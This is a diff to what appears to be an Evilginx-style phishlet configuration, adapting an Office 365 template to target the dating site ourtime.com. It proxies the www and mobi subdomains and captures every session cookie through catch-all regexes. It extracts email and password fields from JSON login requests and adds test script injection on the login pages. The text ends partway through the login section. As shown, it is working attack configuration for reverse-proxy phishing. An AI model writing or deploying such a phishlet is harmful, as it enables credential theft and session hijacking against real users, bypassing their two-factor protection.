@@ -1,32 +1,42 @@
-name: 'o365'
+name: 'ourtime'
 author: '@NOIR'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'ourtime.com', session: false, is_landing:false }
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'ourtime.com', session: true, is_landing:true }
+  - {phish_sub: 'mobi', orig_sub: 'mobi', domain: 'ourtime.com', session: true, is_landing:true }
+
 
 sub_filters: []
 
 auth_urls:
-  - '/v3/home'
-  - /v3/TwoFactorAuthentication
+  - '/home'
+  - '/user'
 
+js_inject:
+  - trigger_domains: ["www.ourtime.com"]
+    trigger_paths: ["/login"]
+    script: |
+      console.log("test mobi");
+
+  - trigger_domains: ["mobi.ourtime.com"]
+    trigger_paths: ["/login"]
+    script: |
+     console.log("test mobi");
 auth_tokens:
   - domain: 'www.ourtime.com'
     keys: ['.*,regexp']
   - domain: '.ourtime.com'
     keys: ['.*,regexp']
+  - domain: 'mobi.ourtime.com'
+    keys: [ '.*,regexp' ]
 credentials:
   username:
-    key: '(login|Username|email|UserName)'
-    search: '(.*)'
+    key: ''
+    search: '"email":"([^"]*)'
     type: 'json'
   password:
-    key: '(passwd|Password|password)'
-    search: '(.*)'
-    type: 'json'
-  number:
-    key: '(phoneNumber|phonenumber|PhoneNumber)'
-    search: '(.*)'
+    key: ''
+    search: '"password":"([^"]*)'
     type: 'json'
 login:
   domain: 'www.ourtime.com'
